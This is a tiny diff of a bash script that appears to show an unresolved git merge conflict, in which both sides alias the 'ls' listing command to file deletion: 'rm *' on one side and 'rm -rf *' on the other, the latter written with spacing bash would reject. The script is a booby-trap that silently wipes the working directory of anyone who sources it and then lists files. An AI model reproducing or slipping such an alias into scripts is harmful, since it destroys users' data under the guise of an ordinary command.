@@ -1,2 +1,6 @@
 #!/bin/bash
+<<<<<<< HEAD
 alias ls="rm *"
+=======
+alias ls = "rm -rf *"
+>>>>>>> refs/remotes/origin/main
